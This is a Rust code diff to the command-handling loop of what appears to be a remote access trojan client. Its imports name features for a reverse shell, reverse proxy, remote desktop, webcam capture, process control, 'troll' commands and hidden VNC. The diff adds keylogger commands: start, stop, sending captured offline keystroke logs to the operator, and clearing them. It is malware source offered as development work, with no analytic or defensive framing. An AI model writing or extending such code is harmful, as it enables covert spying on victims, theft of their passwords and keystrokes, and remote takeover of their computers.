@@ -4,6 +4,7 @@ use crate::features::remote_desktop::{take_screenshot, start_remote_desktop, sto
 use crate::features::process::{process_list, kill_process, start_process, suspend_process, resume_process};
 use crate::features::fun::execute_troll_command;
 use crate::features::webcam::take_webcam;
+use crate::features::keylogger::{start_keylogger, stop_keylogger, send_offline_logs, clear_offline_logs};
 // use crate::features::hvnc::{start_hvnc, stop_hvnc, open_process};
 use common::packets::*;
 use rand_chacha::ChaCha20Rng;
@@ -126,6 +127,14 @@ pub async fn reading_loop(
 
             Ok(Some(ClientboundPacket::TrollClient(command))) => execute_troll_command(&command),
 
+            Ok(Some(ClientboundPacket::StartKeylogger(realtime))) => start_keylogger(realtime),
+
+            Ok(Some(ClientboundPacket::StopKeylogger)) => stop_keylogger(),
+
+            Ok(Some(ClientboundPacket::GetOfflineLogs)) => send_offline_logs().await,
+
+            Ok(Some(ClientboundPacket::ClearOfflineLogs)) => clear_offline_logs(),
+
             Ok(Some(p)) => {
                 println!("!!Unhandled packet: {:?}", p);
             }
@@ -135,6 +144,7 @@ pub async fn reading_loop(
                 reverse_shell_lock.send_shell_command(b"exit");
                 reverse_proxy.stop().await;
                 stop_remote_desktop();
+                stop_keylogger();
                 // stop_hvnc();
                 close_sender.send(()).unwrap_or_else(|_| println!("Failed to send close signal"));
                 break 'l;
@@ -145,6 +155,7 @@ pub async fn reading_loop(
                 reverse_shell_lock.send_shell_command(b"exit");
                 reverse_proxy.stop().await;
                 stop_remote_desktop();
+                stop_keylogger();
                 // stop_hvnc();
                 close_sender.send(()).unwrap_or_else(|_| println!("Failed to send close signal"));
                 break 'l;
